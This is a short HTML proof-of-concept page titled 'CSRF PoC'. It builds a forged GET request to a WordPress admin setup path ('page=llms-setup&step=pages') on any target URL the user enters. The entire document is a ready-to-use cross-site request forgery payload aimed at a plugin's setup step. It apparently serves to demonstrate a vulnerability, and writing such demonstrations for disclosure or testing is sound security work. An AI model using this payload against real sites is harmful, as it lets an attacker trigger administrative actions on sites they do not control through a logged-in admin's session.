<!DOCTYPE html>
<html>
   <body>
      <h1>CSRF PoC</h1>
      <form action="/wp-admin/admin.php?page=llms-setup&step=pages" method="GET" name=form1 id=form1>
	Enter your target:
	 <input id=target name=target placeholder="https://yourserver:1337">
	 <input type="submit" onclick="form1.setAttribute('action', form1.target.value+form1.getAttribute('action'))" value="Submit request" />
      </form>
   </body>
</html>
